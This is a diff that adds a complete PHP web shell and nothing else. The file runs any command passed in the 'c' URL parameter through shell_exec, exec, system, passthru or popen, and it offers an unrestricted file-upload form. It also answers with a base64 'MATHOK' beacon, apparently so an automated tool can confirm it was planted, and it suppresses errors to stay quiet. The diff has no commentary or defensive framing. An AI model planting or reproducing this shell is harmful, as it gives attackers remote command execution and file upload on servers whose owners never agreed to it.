@@ -1,0 +1,39 @@
+<?php
+@ob_start();
+@set_error_handler(null);
+@set_exception_handler(null);
+@ini_set('display_errors',0);
+if(!isset($_GET['c'])&&!isset($_GET['ss'])){
+  @ob_end_clean();
+  header('Content-Type: text/plain');
+  echo 'RXST:'.base64_encode('MATHOK:67700').':RXEND';
+  exit(0);
+}
+if(isset($_GET['ss'])&&$_GET['ss']=='up'){
+  @ob_end_clean();
+  header('Content-Type: text/html');
+  if(isset($_FILES['f'])){
+    move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);
+    echo 'Saved: '.$_FILES['f']['name'];
+  }else{
+    echo '<form method=post enctype=multipart/form-data>'
+        .'<input type=file name=f><button>Upload</button></form>';
+  }
+  exit(0);
+}
+$c=$_GET['c'].' 2>&1';
+$o='';
+if(function_exists('shell_exec')){$o=@shell_exec($c);}
+elseif(function_exists('exec')){@exec($c,$a);$o=implode("\n",$a);}
+elseif(function_exists('system')){ob_start();@system($c);$o=ob_get_clean();}
+elseif(function_exists('passthru')){ob_start();@passthru($c);$o=ob_get_clean();}
+elseif(function_exists('popen')){
+  $h=@popen($c,'r');$o='';
+  while(!feof($h)){$o.=fread($h,4096);}
+  pclose($h);
+}else{$o='BLOCKED';}
+@ob_end_clean();
+header('Content-Type: text/plain');
+echo 'RXST:'.base64_encode($o===null?'':$o).':RXEND';
+exit(0);
+?>
